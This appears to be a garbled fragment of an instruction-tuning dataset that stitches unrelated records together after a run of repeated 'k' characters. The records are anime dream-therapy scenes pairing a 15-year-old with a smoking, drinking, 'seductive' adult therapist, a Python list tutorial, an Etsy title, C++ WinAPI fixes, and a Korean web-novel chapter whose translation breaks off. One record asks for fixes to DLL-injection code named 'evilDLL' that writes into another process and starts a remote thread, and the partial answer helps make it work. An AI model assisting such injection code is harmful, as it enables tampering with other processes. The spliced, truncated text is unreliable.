kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"},{"instruction":"Write an anime scene about a young man chatting with a therapist in a dream.

DREAMSCAPE INTERROGATION ROOM - NIGHT The dream world blurs the lines of reality with its velvety darkness, faintly aglow with shards of subconscious light. We find YUSUKE (15), sitting across from a striking figure. Draconian in appearance, KUROSAWA (25), is the embodiment of both allure and intimidation. Kurosawa's onyx hair is a sharp contrast to his pale skin, complementing his black suit and stark red leather gloves. He reclines in a leather chair with a nonchalant air of disinterest. Yusuke is tense, forearms resting on his knees, eyes darting, trying to keep up with the surrealism of it all. Across from him, Kurosawa's smooth, seductive voice flows like velvety smoke, masking his underlying boredom. KUROSAWA (leaning forward, voice honeyed) Welcome to my humble abode, Yusuke-kun. Here in this realm, I'm your confidant, your guide... But tell me, why seek solitude from your bullies in sleep rather than in wakefulness? Yusuke swallows nervously, wringing his hands, his resolve waning in the presence of the enigmatic therapist. YUSUKE (stammering) I... I try... But every day, it's like they're there, waiting to chip away at me, sensei. Kurosawa's eyes hike up in mild amusement behind the reflective lenses of his glasses. A sardonic quirk twitches at the corner of his straight-lined mouth. KUROSAWA (chuckling darkly) Ah, the ceaseless pursuit of tormentors. How mundane their lives must be. But... we are not here to pity them, are we? Kurosawa spins a glass of rum on the table with a flick of his gloved fingertips. With his other hand, he leisurely flips open the clipboard, eyes skimming the notes he never seems to write down. KUROSAWA (noting Yusuke's gaze) Some vices, Yusuke-kun, are too enthralling for the waking world. They are but relics here—a reminder of dreams untethered from the moral compass that guides your daily drifts. YUSUKE (fixing on the swirling rum) How do I become untethered? How do I stop caring? Make it so the words just... go through me? Kurosawa leans back, draping an arm over the chair's back, a cigarette materializes between his fingers, somehow already lit. KUROSAWA (inhaling deeply, exhales a smoke ring) It's simple, really. You must understand the power of self-perception, the art of detachment. Imagine a world where their words are like this smoke—visible, tangible for a fleeting moment, but ultimately ephemeral. Dissipating... He gestures towards the vanishing smoke with an elegant twist of his wrist, dramatic under the soft interrogation light. KUROSAWA (and now, the heart of it) Every insult, each jab—they're points of contention only if you allow them to pierce your psyche. What if, instead, you chose to let them pass? YUSUKE (desperate for an answer) But how? How do I just let go? Kurosawa's eyes narrow, a gleam of interest igniting within them. He leans forward, the red leather of his gloves whispering as they rub together. KUROSAWA (voice barely above a whisper) Envision yourself as a mighty tree, Yusuke-kun. Words, like wind, may rattle your branches, sway you to and fro. Yet you stand tall, rooted in who you are. The wind may never cease, but it will never topple you. Can you feel it? For a moment, Yusuke's eyes flit closed, Kurosawa's words weaving around him, coaxing forth an unseen strength from within. When he opens his eyes, there's a flicker of confidence, a newfound solidity. YUSUKE (firming his resolve) Yes... I am the tree. They are just the wind. KUROSAWA (satisfied) Precisely. FADE OUT.

DREAMSCAPE INTERROGATION ROOM - NIGHT The room is both timeless and out of place—a sleek stainless steel table reflects the glow of the well-positioned soft white lights above. The walls are a calming neutral gray, adorned with framed inkblots that seem to pulse with the rhythm of the dream. The therapist, DR. MORPHEUS, 25, black hair slicked back, a sharp black suit accentuated with red leather gloves, leans back in his chair. A smooth voice trails from his lips, his tone resonant yet tinged with monotony. Across from him sits LIAM, 15, a young man whose eyes display a quiet determination underneath layers of adolescent uncertainty. He warily observes the bottle of rum, the unused glass, the pack of cigarettes, and the ashtray sitting idly on the table. A clipboard rests in Dr. Morpheus's lap, his pen poised but still. DR. MORPHEUS (smirking) Tell me, Liam. What brings you into the recesses of your own psyche tonight? Liam fidgets, trying to reconcile the strange surrealism of his surroundings and the therapist’s cool, almost eerie demeanor. LIAM I—I want to learn how to deal with... them. The bullies. Dr. Morpheus raises an eyebrow, mildly curious, deducing the gravity of Liam's words as trivial against the backdrop of his own expediencies. DR. MORPHEUS Ignore them, you say? A simple premise, but what's missing is the 'how.' What have you tried before coming to me in your dreams? Liam swallows, the memory of his attempts clawing at his self-esteem. LIAM I’ve ignored their words, turned the other cheek... but it doesn’t work. They’re always there, like shadows. Dr. Morpheus scribbles absent-mindedly on the clipboard, seemingly unphased by Liam's plight. He glances at the bottle and pours himself a measure of rum, never breaking eye contact, the seduction in his voice masking the yawning ennui beneath. DR. MORPHEUS Shadows. Intriguing metaphor. Shadows are mere reflections, devoid of substance. Have you considered embracing them rather than fleeing? Liam frowns, the suggestion more cryptic than helpful. Dr. Morpheus, painfully aware of his own clock ticking in the real world, imparts his counsel with a trace of impatience. DR. MORPHEUS You must be the light, Liam. Shadows bend to the whims of illumination. Become so bright that they cannot touch you. This is where your power lies. Dr. Morpheus takes a draw from his cigarette, a thin trail of smoke ascending, weaving through the interrogation room's sterile air. LIAM (pondering) Be the light... The words echo in the soundproofed chamber of Liam's dreaming mind. Dr. Morpheus leans forward, finishing his drink with a dismissive air. DR. MORPHEUS (standing up) Time is fleeting, even here. Let the shadows fall away and find your brilliance. Remember, only you can render them powerless. Dr. Morpheus taps the ash from his cigarette into the ashtray, extinguishing it with a twist of his gloved fingers. DR. MORPHEUS (flatly) Our session has concluded. Awake now, and show the waking world your newfound resolve. Liam blinks, and the room begins to blur and dissolve around him. With a start, his eyes open to the familiar ceiling of his bedroom. The wisdom from the depths of his subconscious mind leaving a piercing afterglow. FADE OUT."},{"instruction":"Write an anime scene about a young man chatting with a therapist in a dream. He is 15.

WELL-LIT INTERROGATION ROOM - NIGHT - DREAM SEQUENCE The scene opens with ethereal blue light casting long, angular shadows across the room. On one side of a sleek, modern table sits THE THERAPIST, a handsome, young-looking 25-year-old man with jet-black hair and piercing eyes. He exudes an aura of calm composure. He's wearing a sharp black business suit paired with striking red leather gloves. His voice is smooth and almost silkily seductive, yet tinged with a hint of boredom. Sitting across from him is LIAM, a 15-year-old boy with a worried countenance, his hands clasped tightly together on the table. Liam looks around warily, his eyes still adapting to the surreal environment he's found himself in. The Therapist picks up his glass of rum, swirling its contents as he casually leans back in his chair. His other hand, glove creaking slightly, flicks open a gold lighter and brings a cigarette to his lips, taking a slow, deliberate drag. THE THERAPIST (seductively) I don't often take these little excursions into the nocturnal musings of strangers, Liam. But I see the strife in your eyes... Tell me, what shadows haunt your waking hours? LIAM My bullies... no matter where I go, they're always there. Taunting, pushing me around. I can't get away from them, even in my sleep. The Therapist exhales a stream of smoke that twists and tangles before dissipating into nothing. His voice is soothing, almost hypnotic. THE THERAPIST You're here because you wish to learn the art of evasive indifference, to become a master at ignoring those who seek to torment your soul? LIAM (nods) Yeah, I just want to not care, to not let it get to me anymore. The Therapist places his cigarette in the ashtray, and with a deft flick of his wrist, the lighter seems to disappear. He then picks up his clipboard, flipping through it with feigned interest. THE THERAPIST The strength you seek isn't far-fetched, but it's not found in the darkness of ignorance... It lies in the light of self-worth. Liam looks confused, his hope flickering like the flame of the lighter a moment ago. THE THERAPIST (leaning forward, making eye contact) You see, Liam, bullies are like echoes—they need a surface to bounce off to exist. Become that bottomless well, where their voices are lost in the depths of your own conviction. LIAM So I just... ignore them? THE THERAPIST (smiling wryly) No, my young friend. You do not merely ignore them. You listen, and you understand that their words have no bearing on the vast landscape of your potential. Liam's eyes widen, a spark of realization flickering within. THE THERAPIST (standing up, placing his hand on Liam's shoulder) Every now and then, I step away from my own reality to touch the dreams of others. But remember, this encounter is fleeting. The true counsel you seek lies within you, awake and unafraid. Liam stands too, empowered by the Therapist's words, looking ready to face his reality with newfound vigor. As the room begins to dissolve around them—walls blurring into the ether of dreams—the Therapist's figure fades. The scene transitions, with Liam waking up in his own bed, morning light casting gentle rays across his room. A resolute expression adorns his face. He remembers the Therapist's advice and gets ready to face the day with courage he never knew he had.

In Python, a list is a collection of items which can be of different types (e.g., integers, strings, other lists). Lists are ordered, mutable (changeable), and allow duplicate elements. Here's how you can create and manipulate lists in Python: # Creating a List \`\`\`python my_list = [1, 2, 3, 4, 5] # A list of integers my_list2 = [\\"apple\\", \\"banana\\", \\"cherry\\"] # A list of strings my_list3 = [True, \\"Hello\\", 3.14, None] # A list with mixed data types \`\`\` # Accessing Elements Elements in a list are indexed with zero-based indexes. \`\`\`python print(my_list[0]) # Outputs: 1 print(my_list2[1]) # Outputs: banana \`\`\` # Slicing You can access a range of items using slicing. \`\`\`python print(my_list[1:4]) # Outputs: [2, 3, 4] \`\`\` # Changing Values Lists are mutable, which means you can change their content. \`\`\`python my_list[0] = 10 print(my_list) # Outputs: [10, 2, 3, 4, 5] \`\`\` # Important List Methods \`append()\` Adds an element at the end of the list. \`\`\`python my_list.append(6) print(my_list) # Outputs: [10, 2, 3, 4, 5, 6] \`\`\` \`extend()\` Add all elements of a list (or any iterable) to the end of the current list. \`\`\`python my_list.extend([7, 8, 9]) print(my_list) # Outputs: [10, 2, 3, 4, 5, 6, 7, 8, 9] \`\`\` \`insert()\` Insert an item at a defined index. \`\`\`python my_list.insert(1, 'a') print(my_list) # Outputs: [10, 'a', 2, 3, 4, 5, 6, 7, 8, 9] \`\`\` \`remove()\` Removes the first occurrence of a specific value. \`\`\`python my_list.remove('a') print(my_list) # Outputs: [10, 2, 3, 4, 5, 6, 7, 8, 9] \`\`\` \`pop()\` Removes the item at the given index and returns it (default is the last item). \`\`\`python item = my_list.pop() print(item) # Outputs: 9 print(my_list) # Outputs: [10, 2, 3, 4, 5, 6, 7, 8] \`\`\` \`clear()\` Removes all items from the list. \`\`\`python my_list.clear() print(my_list) # Outputs: [] \`\`\` \`index()\` Returns the index of the first occurrence of a specific value. \`\`\`python idx = my_list2.index(\\"banana\\") print(idx) # Outputs: 1 \`\`\` \`count()\` Returns the number of times a specific value appears in the list. \`\`\`python my_list = [1, 1, 2, 3, 4, 4, 4] print(my_list.count(4)) # Outputs: 3 \`\`\` \`sort()\` Sorts the list in ascending order. \`\`\`python my_list.sort() print(my_list) # Outputs: [1, 1, 2, 3, 4, 4, 4] \`\`\` \`reverse()\` Reverses the elements of the list. \`\`\`python my_list.reverse() print(my_list) # Outputs: [4, 4, 4, 3, 2, 1, 1] \`\`\` # List Comprehension List comprehension provides a concise way to create lists. Common applications are to make new lists where each element is the result of some operation applied to each member of another sequence or iterable, or to create a subsequence of those elements that satisfy a certain condition. \`\`\`python # A list comprehension that squares each element squares = [x**2 for x in range(10)] print(squares) # Outputs: [0, 1, 4, 9, 16, 25, 36, 49, 64, 81] \`\`\` # Copying a List When you assign a list to a new variable, you don't create a copy of the list but rather a reference to the original list. If you need a copy of the list, you can use the \`copy()\` method or list slicing. \`\`\`python original = [1, 2, 3] copied_list = original.copy() \`\`\` Lists are one of the most frequently used data structures in Python because of their flexibility and powerful features. Remember that you should use the appropriate data structure for your specific needs, and lists are great for maintaining an ordered collection of items where you might need to frequently add or remove elements."},{"instruction":"Generate an etsy title for a art work that can be added to mugs, painting, tshirt, etc within 140 characters with no & only | to separate without first word being whimsical and is the name of the artA minimalist floral photography setup.","output":"\\"Minimalist Floral Elegance | Versatile Art Design for Mugs, Shirts, Prints | Subtle Botanical Photography Decor\\""},{"instruction":"Как исправить ошибку в строке HMODULE hKernel32 = GetModuleHandle(\\"Kernel32\\"); на языке C++. Компилятор сообщает E0167 аргумент типа \\"const char *\\" несовместим с параметром типа \\"LPCWSTR\\"","output":"Ошибка E0167, о которой вы упоминаете, указывает на несовместимость типов аргумента функции и ожидаемого параметра. В вашем случае аргумент \\"Kernel32\\" имеет тип \\"const char*\\", в то время как функция GetModuleHandle ожидает параметр типа \\"LPCWSTR\\" (что является typedef для \\"const WCHAR*\\" или \\"const wchar_t*\\"), когда компилируется для Unicode. Есть несколько способов, как исправить эту ошибку: 1. Используйте L-префикс для строкового литерала, чтобы сделать его литералом широких символов: \`\`\`cpp HMODULE hKernel32 = GetModuleHandle(L\\"Kernel32\\"); \`\`\` 2. Если ваш проект использует многобайтовые символы (Multi-Byte Character Set, MBCS) вместо Unicode, вы можете изменить настройки проекта для использования многобайтового набора символов, или же использовать функцию GetModuleHandleA, которая явно ожидает \\"const char*\\": \`\`\`cpp HMODULE hKernel32 = GetModuleHandleA(\\"Kernel32\\"); \`\`\` 3. Определите, компилируется ли ваш проект с Unicode по умолчанию: \`\`\`cpp #ifdef UNICODE HMODULE hKernel32 = GetModuleHandle(L\\"Kernel32\\"); #else HMODULE hKernel32 = GetModuleHandleA(\\"Kernel32\\"); #endif \`\`\` Или используйте макрос _TEXT или TEXT для автоматического выбора правильного литерала в зависимости от настроек компиляции: \`\`\`cpp HMODULE hKernel32 = GetModuleHandle(TEXT(\\"Kernel32\\")); \`\`\` Те же самые правила применяются и к другим WinAPI функциям, которые принимают строки в качестве параметров. Стоит помнить, что если ваш проект настроен на использование Unicode, все строковые литералы, передаваемые в WinAPI, должны быть либо широкими (wide) строками с использованием L-префикса, или должны использоваться соответствующие макросы, как TEXT или _T, для обеспечения совместимости."},{"instruction":"Исправь данный код на языке C++:#include <string.h> #include <windows.h> #include <tlhelp32.h> #include <iostream> char evilDLL[] = \\"bruh.dll\\"; unsigned int evilLen = sizeof(evilDLL) + 1; int main(int argc, char* argv[]) { HANDLE ph; // process handle HANDLE rt; // remote thread LPVOID rb; // remote buffer // handle to kernel32 and pass it to GetProcAddress HMODULE hKernel32 = GetModuleHandle(L\\"Kernel32\\"); VOID* lb = GetProcAddress(hKernel32, \\"LoadLibraryA\\"); // parse process ID if (atoi(argv[1]) == 0) { std::cout<<\\"PID not found :( exiting...n\\"; return -1; } std::cout << \\"PID: %i\\", atoi(argv[1]); ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); // allocate memory buffer for remote process rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // \\"copy\\" evil DLL between processes WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL); // our process start new thread rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL); CloseHandle(ph); return 0; }","output":"Чтобы код скомпилировался и работал корректно, потребуется внести несколько исправлений: 1.

Аргумент функции \`GetProcAddress\` для \\"LoadLibraryA\\" должен быть типа \`LPCSTR\`, так как \\"LoadLibraryA\\" всегда принимает ANSI-строки. 3. \`std::cout\` ожидает стандартный аргумент потока вывода, поэтому вместо форматированной строки C, как в \`printf\` функции, нужно использовать оператор \\"<<\\" для каждого значения, которое вы хотите вывести. 4. При использовании \`std::cout\`, необходимо завершать строку символом перевода строки \`n\`, чтобы вывод был корректным и на новой строке. 5. Также у вас есть небольшая ошибка в выделении памяти. Вы вычисляете \`evilLen\` как размер массива \`evilDLL\` плюс один, что уже включает в себя нуль-терминатор, если \`evilDLL\` инициализирован как строковый литерал. 6.

Первым (по индексу \`argv[0]\`) всегда идет имя программы или путь к ней, а последующие элементы (\`argv[1]\`, \`argv[2]\`, ...) содержат дополнительные аргументы. Так как в коде функции \`main\` аргумент \`argv[1]\` используется для получения идентификатора процесса (PID), ожидается, что в командной строке при запуске программы будет передан хотя бы один аргумент после имени программы, который должен быть строкой, содержащей число (PID).

‘욕이야 그가 먹는 거고, 우리는 이 자극을 전달하면 그만이지.’ 한편. 현 상황을 생중계로 보는 헐리웃 곳곳 인물들의 반응은 반반이었다. ‘삐에로:빌런의 탄생’ 촬영 세트장에 모인 안 가복, 프로듀서 노라 포스터는 걱정과 쾌감이 적절히 섞였고. “이런! 이건 너무 세게 나간 거 아닌가요??!“ “그런가? 흠- 근데 강우진이 원체 이런 캐릭터니까요. 오히려 난 엄청난 어그로가 끌릴 거 같은데?” 배우들도 비슷했다. 크리스 하트넷은 명백히 즐기고 있었다. “내일이면 언론 메인은 죄다 우진씨가 장악하겠어, 세상 어느 배우가 자기 영화를 이렇게 홍보해? 외형만이 아닌, 진짜 ‘조커(Joker)’로 대중들을 대할 줄은- 담이 두둑한 그만이 가능한 거지.” ‘컬럼비아 스튜디오’ 간부들도, ‘야수와 미녀’ 제작진들도, ‘존 페르소나’의 조셉 펠튼 외의 다수도. 수많은 거물들 은 강우진을 구경하느라 바빴다. 이어 포토존의 강우진이 퇴장할 쯤엔. “여기까지 하겠습니다.” 생중계를 지켜보는, 한국과 일본 포함 전세계의 대중들은 날뛰는 것으로 부족한 정도였다. 발광하는 채팅이 폭발 하는 중. -ᄏᄏᄏᄏᄏᄏ지렸닥ᄏᄏᄏᄏᄏᄏ -강우진이 지금 보든지 말든지라고 한 거야? 내가 본 게 맞아? -진짜 미쳐버린 건가…인터뷰를 저따위로 하다니… -여기 외국인들 지금 정신나감ᄏᄏᄏᄏᄏᄏ너네는 이제 처음 강우진을 맛보는 거지만 우린 자주봄ᄏᄏᄏᄏᄏ -퍼포먼스치고는 조금 과한데? 얼마나 작품에 자신 있으면 저러지?? -그보다 여기 한국인들 왜 이렇게 좋아해? 자기 나라 배우가 정신이 나간 게 즐거워? -↑포기해ᄏᄏᄏᄏ포기하면 편하다 그리고 그냥 즐격ᄏᄏᄏᄏᄏᄏᄏ -깡우진 폼 미쳤다 -레드카펫부터 보인 게 전부 작품의 캐릭터라는 거지? 근데 마지막 대사는 그냥 자기 멋대로 한 거 같은데 -현실에서 차기작 티저 보인 건 강우진이 처음 아닌가? -어이어이 놀라지마 강우진의 미친 짓은 이제 시작이라고?ᄏᄏᄏᄏ . . . 한국어, 일본어, 영어, 불어 등 언어는 제각각에 포격하듯 채팅이 쉴새 없이 올라왔고 반응은 극명하게 갈렸다. 욕설이 반, 격한 응원이 반. 욕이 포함된 부정적 반응엔 또라이다, 미친놈이다, 뭐 저딴 병신이 다 있냐, 에미상을 무시하는 거다, 선을 넘었다, 심하게 나댄다 외의 말로 표현 못 할 욕설이 넘실거렸다. 반대로 응원에는 찬양과 극찬이 팽팽하게 맞섰다. 진창이 따로 없었다만 하나 확실한 건, 강우진이 세계로 가지는 영향력이 무시무시하다는 것. 실제로 ‘에미상’레 드카펫엔 수많은 헐리웃 탑배우들이 즐비했으나. -강우진이 진심 난 놈이다!! 욕이든 찬양이든 전세계를 요동치게 함ᄏᄏᄏᄏ 대중들이 울부짖는 건 강우진뿐이었다. 뒤로. 포토존에서 퇴장한 강우진이 장발을 쓸면서도. -스윽. 진행스탭과 가드들의 안내에 따라 메인 건물 방향으로 이동했다. ‘에미상’의 시상식이 열릴 초대형 공연장 또는 홀과 함께, 여러 대기실이 준비된 건물이었다. 건물 입구를 통과한 우진의 눈엔 외국인들이 미어터지는 로비가 보였 다. 관계자, 감독, 연출자, 배우, 유명인 등이 섞인 상태. 대놓고는 아니지만 그들은 대체로 방금 입장한 강우진을 힐끔거렸다. 그 순간. “우진아, 이쪽!” 외국인들로 득실거리는 사이 정장을 차려입은 최성건과 팀원들이 강우진을 불렀다. 금세 달라붙은 팀원들은 모두 우진에게 엄지를 보였고 미소를 띤 최성건도 같았다. “퍼포먼스 제대로 먹혔다, 너도 봤겠지만 여기 인간들 죄다 네 얘기 밖에 안 해.” 안 그래 주면 섭하죠, 나름 고심해서 준비한 건데. 속으로 읊조린 강우진은 별수롭지 않게 고개를 끄덕였다. “다행이네요.” “아직 확인은 안 했는데 기사는 진작에 터졌을 거다.” 곧, 최성건이 시간을 확인하면서도 서둘렀다. “어이구! 시간! 우진아, 바로 옷 갈아입자. 메이크업도!” 얼굴 빼곤 ‘조커(Joker)'인 강우진이 팀원들과 함께 미리 배정받은 대기실로 움직였다. 후로 약 30분 정도 흘렀고. -달칵. 대기실에서 나오는 강우진. ”…“ 지금의 그에게선 ‘조커(Joker)’ 모습을 찾을 순 없었다. 네이비 턱시도에 흑발을 깔끔하게 뒤로 넘긴, 그야말로 명 품을 휘감아 멋을 제대로 부린 우진이었으니까. 양해를 구한 ‘조커(Joker)’는 여기까지. 잠시간 자신의 모습을 내려보던 우진이 속으로 읊조렸다. ‘진짜 뭔가 ‘조커(Joker)’ 같긴 하네.’ 알맹이가 따로 있고 가면을 바꿔 쓰는 형태가 그랬다. 순간, 안가복 감독의 말이 떠오르는 그. ‘삐에로:빌런의 탄생’의 핵심 내용을 알리려 한다고 착각할만하네.‘ 강우진은 그런 깊은 속뜻 없이 그저 관심 증폭이 목적이었지만 어느 쪽이 됐던 대성공. 우진은 지금부턴 ‘조커(Joker)’가 아닌, ‘이로운 악’의 ‘장연우’로서 움직여야 했다. 곧, 강우진이 다시금 로비 방향으로 걸었다. 그쯤 누군가 강 우진을 영어로 불렀다. “우진씨.” 시선을 돌리니 검은색 드레스에 찰랑거리는 금발이 눈에 띄는 마일리 카라가 웃고 있었다. 바로 헉하는 강우진. 물론, 속으로만. ‘워- 미쳤네.’ 카라의 빼어난 미모도 미모지만, 분위기? 아우라? 전체적인 자태가 입이 쩍 벌어질 정도였다. 잠시 정신이 날아간 우진의 옆으로 카라가 붙으며 팔짱 꼈다. “가죠.” 이런 시상식에선 으레 볼 수 있는 그림이라 이상하진 않지만, 퍼뜩 정신을 차린 강우진은 그녀의 팔짱 낀 손이 미세히 떨린다는 걸 인지했다. ‘뭐지? 얼굴만으론 여유가 넘치는데 긴장한 건가? 아니면- 혹시 나 때문에?’ 정답이었다. 인파 사이로 진입하는 카라는 지금 정신이 없었다. ‘아우, 그냥 동료 느낌으로 낀 팔짱인데 왜 이렇게 심장이 뛰는 건데?’ ‘이로운 악’ 파트1에 카라가 출연했으니 ‘에미상’ 초청은 당연했고, 지금껏 연기나 가수 관련으로 많은 시상식을 들락거린 카라였다. 허나 오늘의 ‘에미상’은 뭔가 감각부터가 남달랐다. 가만히 있던 우진이 대뜸 작게 물었다. “떨립니까?” “…아니요? 내가 왜 떨려요?” “익숙한 냄새가 나서요. 저번에 말한 컨셉질 같은 거.” “내가 아무렇지 않은 척하고 있다는 말을 하고 싶어요?” “나는 아까 그랬거든요. 레드카펫 행진할 때.” “전혀 그렇게 안 보이던데요.” “그러니까 그게 내가 말했던 컨셉.” 이때. “오우!” 둘의 대화를 끊으며 끼어드는 외국인들. 헐리웃 감독 중 꽤나 유명한 인물이었다. “마일리 오랜만이군. 그리고- 강우진씨? 처음 보네요.” “네, 오랜만이네요 감독님.” “안녕하십니까.” 강우진과 카라는 ‘에미상’이 열리는 홀에 가기도 전에 수많은 인사를 나눠야 했다. 이 감독을 시작으로 여러 인물 들이 들러붙었다. 당연한 현상이긴 했다. 카라도 카라지만, 그들의 목적은 전부 강우진이었다. “하하하, 우진씨. 레드카펫 퍼포먼스가 대단하던데요? 작품의 티저를 현실에서 보여준다라- 아이디어에 반했습 니다.” “감사합니다.” “나중에 더 길게 얘기하고 싶군요.” 호의적으로 대하는 사람이 있는가 하면 아예 대놓고 비아냥거리는 인물도 있었다. “지금이야 다들 당신의 행동이 생소하니 신기함에 호기심을 가지지만, 앞으로도 헐리웃에서 계속 활동할 생각이 면 조금은 겸손해야 할 겁니다.” 물론, 강우진은 흔들림이 없었다. “아직은 괜찮다는 얘기네요.” ”…그 자만함이 언젠가 발목을 잡겠죠.” “내가 알아서 하죠.” 우진은 속으로 ‘뭐야 저 새끼’ 정도의 간단한 감상이 다였지만, 그의 옆에 붙은 마일리 카라는 심히 걱정하는 투였다. 퉁명스러움이 섞이긴 했다. “저 사람 원래 그래요, 워낙 옛날 헐리웃부터 있던 인물이라 꽉 막힌 부분도 있고. 신경쓰지 말아요.” “딱히 상관없어요. 누군지도 모르겠고.” 그렇게 많은 외국인들을 상대하던 강우진이 가까스로. -스윽. ‘에미상’ 시상식이 열릴 공연장 또는 홀에 들어섰다. 바로 내면으로 욕부터 박는 강우진. ‘와- 씨바, 규모 지리네.’ 그의 반응이 전혀 이상하지 않은 사이즈였다. 웅장함을 넘어선 광활함이랄까? 일단 규모로 보면 대형 극장을 10 개쯤 합친 크기에, 높고 컴컴한 천장에는 커다란 진주 형태의 조명들이 가득했다. 밤하늘에 수놓은 별 같기도 하다. 그런 홀에 좌석만 1층, 2층으로 수만이 넘어갔고 방송팀이 즐비한 정면 무대엔 거대한 모니터도 여럿 달렸다. 뭣보다 눈길을 사로잡는 건. ‘무대 위에 저 동상은 그건가? 트로피??‘ “에미상의 시상식이 진행될 무대였다. 무대만 해도 어마무시한 사이즈였다. 그곳 중앙에 당당히 놓인, 원형 구 형 태를 잡은 날개 달린 여자의 동상. ‘에미상’의 트로피였다. 사람의 10배쯤 넘는 크기. 동상 양옆에는 두 배는 큰 모니 터가 세워졌고, 노란색 바탕에 ‘EMMYS’라는 글자가 박혀 있다. 칸부터 한국의 시상식을 경험한 강우진이었지만. ’…퀄 지리네.‘ 솔직히 ‘에미상’의 반도 못 따라간다 생각했다. 왜 ‘에미상’이 방송계 ·아카데미상’이라 불리는지 절절히 느낄 수있는 대목. 거기다 헐리웃은 물론, 전세계로 난다긴다하는 인물들이 가득한 상황. 이 전체를 눈에 담는 강우진은 실로 경이로움이 솟았다. 새삼 여기 있는 자신이 안 믿긴달까? ‘다리 굳어질라 하네, 정신 차려라 강우진.’ 여기서 두리번거리던 카라가 말했다. “‘이로운 악’ 자리는 저쪽인 거 같네요.” 그녀가 손을 뻗을 때였다. “마일리.” 약간은 중후한 목소리의 남자 목소리가 옆쪽에서 들렸고, 우진과 카라가 동시에 고개를 돌렸다. 민머리에 수염 난, 검은 턱시도를 차려입은 남자가 다가오고 있었다. 순간, 강우진은 저 남자가 배우임을 직감했다. 어디서 많이 봤으 니까. ‘아- 백퍼 어디서 봤는데.’ 하지만 당연히 이름은 떠오르지 않았다. 카라가 그의 이름을 대신 읊조렸다. “매튜.” 매튜 메이저스. 나름 경력이 꽉 찬 중년 헐리웃 탑배우로, 연기적으로는 깔 게 없는 실력파 배우였다. 현재는 인기 미드의 주연으로 출연 중. 그런 그가 카라와 악수한 뒤. -슥. 무심한 얼굴인 강우진에게도 손을 내밀었다. “강우진씨, 반갑습니다.” “안녕하세요.” 적당히 답한 우진은 느꼈다. ‘이 아재! 왜 손에 힘주고 난리지??’ 악수 중인 매튜 메이저스가 손에 악력을 넣는다는 것. 우진은 왜인지 지면 안 된다는 생각이 들었다. “…” 무던한 얼굴로 똑같이 손에 힘을 넣었다. 딱히 티는 안 났지만 그대로 몇 초 정도 흘렀고, 손을 놓은 둘 중 매튜가 한 손을 주머니에 쑤시면서도 입을 열었다. “‘투나잇 쇼’ 잘 봤어요, 우리가 안중에 없다는 인터뷰도. 거슬렸어요, 황당하기도 하고.” ‘우리?’ 뭔가를 직감한 우진에게 카라가 속삭였다. “그는 당신과 같이, 드라마 부문 남우주연상 후보 중 한 명이에요.” 즉, 앞의 민머리 매튜 메이저스는 강우진이 포함된 후보 5명 중 한 명이란 얘기. 매튜는 우진의 인터뷰가 상당히 마음에 안 들었던 모양이었다. ‘거슬렸다’라는 표현을 섞었으니까. 이어 매튜가 강우진에게 다시 말했고. “이 헐리웃은 한국배우 한 명이 뭘 어찌할 정도로 좁지 않지. 그래서 당신에게 직접 듣고 싶군요, 그 거슬리는 인 터뷰는 방송 분위기에 맞춰 적당히 호응해준 거겠죠?” 약간의 협박이 가미된 어투. 무표정인 우진의 낮은 대답은 빨랐다. “거슬렸다면 성공이네요.” 강우진의 ‘노빠꾸’ 대답에 민머리 매튜 메이저스가 미간을 좁혔다. “허- 성공? 그렇다는 건 역시 그 인터뷰가 다분히 의도적이었다는 건가?“ ”…“ 무심히 매튜의 얼굴을 보는 강우진. 그의 표정이 삭막하다. 이에 우진은 덤덤한 척을 했다만, 속으로는 약간 쫄았 다. ‘아니? 의도 아니었다고! 그거 착각이었다니까? 나는 걍 주변을 둘러볼 생각이 없다’고 답한 거였다고.’ 그런데 헐리웃은 그것을 멋대로 재단해 세상에 발표했다. ‘강우진’은 나머지 후보들이 안중에도 없다는 식으로. 덕분에 한동안 언론, 여론이 시끌시끌했었다. 우진은 매튜의 심정이 이해되기도 했다. 나타난 지 얼마 되지도 않은 핏덩이가, 헐리웃 경력 수십 년인 매튜를 무시한 꼴이었으니까. ‘약간- 내가 심한호 선배님을 놀린 꼴인가?’ 하지만 뭐 어쩌겠는가? 이미 물은 엎질러졌고 이만한 착각은 강우진에게 익숙했다. 앞의 매튜를 또 볼지는 모르 겠다만, 이런 상황에 우진이 선택할 건 늘 언제나 같았다. ‘개썅마이웨이.' “난 언제나 진심으로 행동합니다.” ”…그런가.“ “네.” 서로를 바라보는 두 남자. 아니 노려본다고 해야하나? 그러다 매튜가 픽 웃었다. “자신감과 자만함은 한 끗 차이지. 자네의 능력은 인정하는 바이나- 너무 나대면 꺾일 거야, 아무리 잘 한다고 해도 상대 배우에 관한 존중은 해야하지 않겠나.” “존중은 합니다. 실제로 제가 한 인터뷰엔 ‘다른 배우들이 안중에도 없다’는 단어가 포함돼 있지 않죠. 그저 주변 을 신경 쓰지 않는다고 했을 뿐.” “그 말이 그 말 아닌가요?.” “아니요, 확실히 말하자면 그냥 내 할 일만을 할 뿐이라는 겁니다. 다른 것에 눈길을 주지 않고 말이죠.” ”…“ 어느새 양손을 주머니에 찌른 매튜가 몇 초간 강우진을 응시했고, 작게 숨을 뱉으면서도 재차 입을 열었다. “강우진씨 당신이 한국배우로서 헐리웃에 첫 길을 닦는 것인데- 너무 막 나가는군.” “글쎄요, 방금 말했다시피 난 내 길을 갈 뿐입니다.” “오늘의 '에미상’이 그리 자신이 있나?” “선택은 우리가 하는 게 아니죠.” 대중이, 세상이 해주는 것이라는 답변. 정답이었고 민머리 매튜는 자신의 턱수염을 쓸다가, 몸을 휙 돌려 자신의 좌석으로 성큼성큼 걸어갔다. 그런 매튜가 혼잣말을 뱉었다. “어찌 될지 보자고, 칸의 기적이 ‘에미’에서도 이어질지.” < 에미 (3) > 끝","output":"< Emmy (3) > Due to the short and concise lines of Kang Woo-jin, who had 